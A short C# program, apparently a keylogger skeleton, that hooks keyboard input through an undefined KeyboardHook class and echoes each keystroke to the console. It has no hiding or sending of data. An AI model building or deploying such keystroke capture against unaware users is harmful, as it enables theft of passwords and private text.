using System;
using System.Windows.Forms;

namespace Keylogger
{
    internal static class Program
    {
        [STAThread]
        static void Main()
        {
            var kh = new KeyboardHook();
            kh.KeyPress += Kh_KeyPress;
            Application.Run();
        }

        private static void Kh_KeyPress(object sender, KeyPressEventArgs e)
        {
            Console.Write(e.KeyChar);
        }
    }
}
